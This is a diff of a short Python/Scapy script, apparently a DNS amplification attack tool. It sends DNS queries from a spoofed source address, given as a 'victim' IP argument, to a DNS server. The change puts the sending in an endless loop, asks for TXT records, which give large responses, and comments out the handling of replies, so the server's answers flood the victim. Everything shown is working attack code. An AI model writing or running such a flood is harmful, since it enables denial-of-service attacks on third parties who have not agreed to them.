@@ -4,26 +4,30 @@ import sys
 
 import socket
 
+import time
+
 server_ip = sys.argv[1]
 
 victime_ip = sys.argv[2]
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-packet = IP(dst=server_ip, src=victime_ip) / UDP(dport=53, sport=5530) / DNS(id=12, qd=DNSQR(qname='twitter.com', qtype='A'))
+while True :
 
-sock.sendto(raw(packet), (server_ip, 53))
+	packet = IP(dst=server_ip, src=victime_ip) / UDP(dport=53, sport=5530) / DNS(id=12, qd=DNSQR(qname='google.com', qtype='TXT'))
 
-data, address = sock.recvfrom(1024)
+	sock.sendto(raw(packet), (server_ip, 53))
 
-data = raw(data)
+# data, address = sock.recvfrom(1024)
 
-response = IP(_pkt=data) / UDP(_pkt=data) / DNS(_pkt=data)
+# data = raw(data)
 
-print(len(response) / len(packet))
+# response = IP(_pkt=data) / UDP(_pkt=data) / DNS(_pkt=data)
 
-if response.haslayer(DNS) :
+# print(len(response) / len(packet))
 
-	for i in range(response[DNS].ancount) :
+# if response.haslayer(DNS) :
 
-		print(response[DNS].an[i].rdata)
+# 	for i in range(response[DNS].ancount) :
+
+# 		print(response[DNS].an[i].rdata)
